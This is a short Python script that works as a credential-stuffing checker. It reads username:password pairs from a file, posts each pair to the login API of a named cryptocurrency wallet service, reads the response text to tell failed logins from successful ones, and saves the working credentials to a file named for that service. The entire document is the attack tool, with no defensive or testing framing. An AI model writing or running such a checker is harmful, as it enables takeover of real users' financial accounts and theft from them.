import requests
import json

file = open("iglo.users","r")
for line in file:
	info = line.split(":")
	username = info[0]
	passw = info[1].replace("\n","")


	payload = {'username': username,'password':passw.replace("\n","")}
	headers = {'content-type': 'application/json'}
	url = "https://api.coins.asia/v3/jwt/login"

	response = requests.post(url, data=payload)

	if "Email and password don't match" in response.text:
            print "[-] login failed: " + username +":"+passw 
	if "Username must be valid email or phone number" in response.text:
            print "[-] login failed: " + username +":"+passw
	if "csrftoken" in response.text:
            print "[+] login ok :" +username + ":" + passw
	    f = open('valid.coins.ph', 'a')
	    f.write(username + ":" + passw + "\n")  
            f.close()
